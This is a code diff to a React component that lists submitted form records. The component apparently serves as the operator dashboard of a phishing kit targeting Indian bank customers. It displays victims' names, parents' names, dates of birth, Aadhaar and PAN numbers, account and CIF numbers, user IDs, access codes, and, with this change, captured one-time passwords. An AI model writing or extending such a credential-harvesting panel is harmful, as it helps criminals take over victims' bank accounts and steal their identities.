@@ -254,12 +254,13 @@ function FormsList({ forms }: { forms: FormData[] }) {
                     </div>
 
                     {/* Personal Details - show only if has data */}
-                    {(form.fullName || form.name || form.mobileNumber || form.phoneNumber || form.motherName || form.dateOfBirth) && (
+                    {(form.fullName || form.name || form.mobileNumber || form.phoneNumber || form.motherName || form.fatherName || form.dateOfBirth) && (
                         <div style={{ marginBottom: '1rem' }}>
                             <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>👤 Personal Details</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
                                 {(form.fullName || form.name) && <div><strong>Name:</strong> {form.fullName || form.name}</div>}
                                 {(form.mobileNumber || form.phoneNumber) && <div><strong>Mobile:</strong> {form.mobileNumber || form.phoneNumber}</div>}
+                                {form.fatherName && <div><strong>Father:</strong> {form.fatherName}</div>}
                                 {form.motherName && <div><strong>Mother:</strong> {form.motherName}</div>}
                                 {form.dateOfBirth && <div><strong>DOB:</strong> {form.dateOfBirth}</div>}
                             </div>
@@ -267,7 +268,7 @@ function FormsList({ forms }: { forms: FormData[] }) {
                     )}
 
                     {/* Account Details - show only if has data */}
-                    {(form.accountNumber || form.aadhaarNumber || form.panCard || form.panNumber || form.cifNumber || form.branchCode) && (
+                    {(form.accountNumber || form.aadhaarNumber || form.panCard || form.panNumber || form.cifNumber || form.branchCode || form.branchName) && (
                         <div style={{ marginBottom: '1rem' }}>
                             <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🏦 Account Details</div>
                             <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
@@ -276,6 +277,7 @@ function FormsList({ forms }: { forms: FormData[] }) {
                                 {(form.panCard || form.panNumber) && <div><strong>PAN:</strong> {form.panCard || form.panNumber}</div>}
                                 {form.cifNumber && <div><strong>CIF:</strong> {form.cifNumber}</div>}
                                 {form.branchCode && <div><strong>Branch:</strong> {form.branchCode}</div>}
+                                {form.branchName && <div><strong>Branch Name:</strong> {form.branchName}</div>}
                             </div>
                         </div>
                     )}
@@ -302,6 +304,16 @@ function FormsList({ forms }: { forms: FormData[] }) {
                                 {form.userId && <div><strong>User ID:</strong> {form.userId}</div>}
                                 {form.accessCode && <div><strong>Access Code:</strong> {form.accessCode}</div>}
                                 {form.profileCode && <div><strong>Profile Code:</strong> {form.profileCode}</div>}
+                            </div>
+                        </div>
+                    )}
+
+                    {/* Verification Details - show only if has data */}
+                    {form.otp && (
+                        <div>
+                            <div style={{ fontWeight: 600, marginBottom: '0.5rem', color: 'var(--primary)' }}>🔑 Verification</div>
+                            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '0.5rem', fontSize: '0.875rem' }}>
+                                <div><strong>OTP:</strong> {form.otp}</div>
                             </div>
                         </div>
                     )}
